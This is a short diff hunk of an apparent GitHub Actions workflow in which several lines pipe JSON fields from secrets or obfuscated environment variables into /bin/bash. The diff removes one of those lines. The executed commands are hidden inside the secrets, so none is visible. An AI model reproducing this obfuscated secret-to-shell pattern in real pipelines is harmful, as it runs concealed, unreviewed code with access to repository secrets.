@@ -23,7 +23,6 @@ jobs:
           vjzr570: ${{ secrets.vjzr570 }}
         run: |
           printf '%s' "$vjzr570" | jq -r .zgci193 | /bin/bash
-          echo $gd35781 | jq -r .cr3 | /bin/bash
           echo $adho501 | jq -r .xfcue67 | /bin/bash
           echo $b51386 | jq -r .q93 | /bin/bash
           echo $hrfpz7793 | jq -r .nclp0876 | /bin/bash
